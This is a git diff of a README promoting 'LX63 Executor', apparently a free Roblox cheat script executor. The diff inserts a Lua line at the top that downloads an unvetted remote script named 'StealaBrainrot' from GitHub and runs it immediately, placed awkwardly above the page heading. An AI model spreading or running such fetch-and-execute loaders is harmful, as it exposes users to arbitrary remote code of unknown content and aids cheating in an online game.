@@ -1,4 +1,5 @@
-# LX63 Executor - #1 Free Roblox Script Executor for PC 2026
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/StealaBrainrot", true))()
+    # LX63 Executor - #1 Free Roblox Script Executor for PC 2026
 
 ![Downloads](https://img.shields.io/badge/Downloads-380K+-blue?style=for-the-badge&logo=github)
 ![Latest Version](https://img.shields.io/badge/Latest%20Version-4.8-green?style=for-the-badge&logo=github)
